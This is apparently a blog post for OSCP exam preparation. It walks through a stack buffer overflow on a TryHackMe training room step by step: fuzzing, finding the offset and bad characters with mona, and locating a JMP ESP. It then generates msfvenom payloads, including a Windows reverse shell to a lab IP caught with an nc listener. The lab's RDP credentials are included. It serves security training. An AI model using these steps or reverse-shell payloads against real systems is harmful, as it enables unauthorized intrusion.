---
title: Easy OSCP Bufferoverflow Preparation
description: Easy, simple yet effective and working OSCP Buffer Overflow preparation
author: hum4ng0d
date: 2020-11-21
categories: [Exploit, PoC]
tags: [windows, oscp, exploit, exploit development, buffer overflow, linux]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/oscp_bufferoverflow/feature.png
  alt: OSCP Buffer Overflow Preparation
---

For preparing OSCP Buffer Overflow, you just need a simple script that can fuzz and send buffer. That's it. You don't need to know a lot about python scripting nor complicated stuff. This is the most effective way and time efficient way. If you practice enough, you can beat buffer overflow machine in just 30 minutes. So you can have lots of time for the other 4 machines. If you still need help, feel free to reach out to me on twitter.

Free TryHackMe Room: [TryHackMe/bufferoverflow](https://tryhackme.com/room/bufferoverflowprep)

Thanks to Tib3rius for this awesome tryhackme room. 

Here is the link for all the scripts: [hum4nG0D/OSCP_Bufferoverflow_Prep](https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep)

I will take overflow1 from THM bufferoverflow room as an example. So fire up the machine and then connect. You will need to do `Immunity > Debug > restart > play` for each step.

```
> xfreerdp /u:admin /p:password /cert:ignore /v:192.168.10.10
  
> git clone https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep.git
```

<br>

### 01 Fuzzing

```c++
> ./01-fuzz.py
```

Press `Ctrl + C` after the application crushed. Note down the byte number. (Example: Crushed at 2000)

<br>

### 02 Finding Offset

```c++
> msf-pattern_create -l 2000

> ./02-offset.py
```

At this point, I'm assuming you have Mona setup. 

```c++
> !mona findmsp -distance 2000
```

Find EIP normal pattern. (Example: EIP contains normal pattern : 0x42987857 (offset 1876))

<br>

### 03 Controlling EIP

```c++
> ./03-eip.py
```

You should see `424242` for EIP.

<br>

### 04 Finding Bad Characters

Setting up mona working directory:

```c++
> !mona config -set workingfolder c:\mona\%p
```

![Mona Working Directory](/assets/img/oscp_bufferoverflow/workingdir.png)

<br>

Generating byte array:

```c++
> !mona bytearray -b "\x00"
```

![Generating Bytearray - Mona](/assets/img/oscp_bufferoverflow/bytearray.png)

<br>

Running the script:

```c++
> ./04-badchar.py

> !mona compare -f C:\mona\oscp\bytearray.bin -a 0321FF88
```

Generating byte array with bad characters removed. Update the script and run again until you see 'Unmodified' status in mona memory comparison results.

```c++
> !mona bytearray -b "\x00\x0d"

> ./04-badchar.py

> !mona compare -f C:\mona\oscp\bytearray.bin -a 03B2FF88
```

![Unmodified](/assets/img/oscp_bufferoverflow/unmodified.png)

<br>

### 05 Finding a Jump Point

Replace the bad characters with what you find:

```c++
> !mona jmp -r esp -cpb "\x00\x0d"
```

Set the break point by entering the pointer address and pressing `F2`.

![Break point](/assets/img/oscp_bufferoverflow/pointer.png)

<br>

Make sure to edit the script and add the pointer address in reverse order. Then run the script.

```c++
> ./05-pointer.py
```

If the pointer address stop at EIP. You are good to go.

<br>

### 06 Popping Calculator

Again, don't forget to replace with the bad characters that you find:

```c++
> msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0d' -f c

> ./06-calc.py
```

After successfully popping the calculator app, next step is to get a shell.

```c++
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.11 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0d"

> nc -lvnp 443

> ./07-exploit.py
```

And that's it. You should be able to get a shell now. 